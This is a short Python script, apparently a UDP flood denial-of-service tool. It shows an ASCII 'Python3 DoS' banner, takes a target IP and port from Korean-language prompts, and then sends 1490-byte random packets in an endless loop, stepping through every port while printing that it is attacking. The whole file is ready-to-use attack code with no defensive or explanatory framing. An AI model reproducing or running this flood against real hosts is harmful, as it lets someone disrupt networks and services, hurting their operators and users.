import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
print(" ____        _   _                 _____   ____")
print("|  _ \ _   _| |_| |__   ___  _ __ |___ /  |  _ \  ___  ___ ")
print("| |_) | | | | __| '_ \ / _ \| '_ \  |_ \  | | | |/ _ \/ __| ")
print("|  __/| |_| | |_| | | | (_) | | | |___) | | |_| | (_) \__ \ ")
print("|_|    \__, |\__|_| |_|\___/|_| |_|____/  |____/ \___/|___/")
print("       |___/\n")

print("제작   : 한유이")
print("깃헙 : https://github.com/Han-seungjae")

ip = input("타겟 IP : ")
port = int(input("포트       : "))
sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print("총 %s 만큼 패킷을 보냄, 대상 IP: %s 공격중인 포트:%s"%(sent,ip,port))
    if port == 65534:
        port = 1
